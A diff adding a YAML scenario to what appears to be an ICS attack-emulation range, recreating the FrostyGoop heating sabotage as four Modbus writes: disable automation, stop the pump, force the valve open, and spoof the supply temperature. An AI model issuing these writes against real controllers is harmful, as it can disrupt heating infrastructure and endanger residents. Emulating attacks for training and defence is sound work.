@@ -1,0 +1,68 @@
+# Reference `steps:` scenario - the same district-heating sabotage FrostyGoop
+# performs, expressed as declarative protocol operations instead of a payload
+# script. This is the form the copilot emits from a report: every write is stated
+# outright, and each one is validated by the same build_modbus_cmd() that backs
+# the Custom Target tab, so it can express nothing you could not already do by
+# hand in the UI.
+#
+# Kept alongside the scripted frostygoop scenario on purpose: the two should put
+# the same writes on the wire, which is what makes this a usable reference.
+id: frostygoop_steps
+name: FrostyGoop (declarative)
+family: FrostyGoop (2024)
+year: '2024'
+protocol: Modbus TCP
+target: PLC-7 Heating District ({heating}:502)
+desc: The FrostyGoop heating sabotage written as declarative protocol steps rather than a payload
+  script. Disables automation, stops the circulation pump, forces the heat-exchanger valve open, then
+  injects a false supply temperature so the HMI still reads normal.
+color: '#00bcd4'
+briefing:
+- DECLARATIVE SCENARIO - FrostyGoop equivalent
+- Each step below is one validated Modbus operation, not a script.
+- ''
+- '1. FC05 coil 3 = OFF   disable automation (manual mode)'
+- '2. FC05 coil 1 = OFF   stop the circulation pump'
+- '3. FC05 coil 0 = ON    force the heat-exchanger valve wide open'
+- '4. FC06 HR 1  = 590    inject a false 59.0 C supply temperature (x10 encoded)'
+- ''
+- 'VISIBLE IMPACT: supply temperature collapses while the HMI still reads 59 C'
+- ''
+- ICS MITRE ATT&CK
+- T0855  Unauthorized Command Message (FC05 coil writes)
+- T0836  Modify Parameter (false supply temperature)
+- T0803  Block Command Message (disable auto mode)
+- T0856  Spoof Reporting Message (HMI reads the injected value)
+watch:
+  plc: heating
+  proto: modbus
+  unit: 11
+  kind: heating
+  restore: heating
+steps:
+- protocol: modbus
+  module: modbusclient
+  plc: heating
+  port: 502
+  options: {action: WRITE_COIL, address: 3, data: 0, unit: 11}
+  duration: 5
+- protocol: modbus
+  module: modbusclient
+  plc: heating
+  port: 502
+  options: {action: WRITE_COIL, address: 1, data: 0, unit: 11}
+  duration: 5
+- protocol: modbus
+  module: modbusclient
+  plc: heating
+  port: 502
+  options: {action: WRITE_COIL, address: 0, data: 1, unit: 11}
+  duration: 5
+- protocol: modbus
+  module: modbusclient
+  plc: heating
+  port: 502
+  options: {action: WRITE_REGISTER, address: 1, data: 590, unit: 11}
+  mode: repeat
+  interval: 5
+  duration: 30
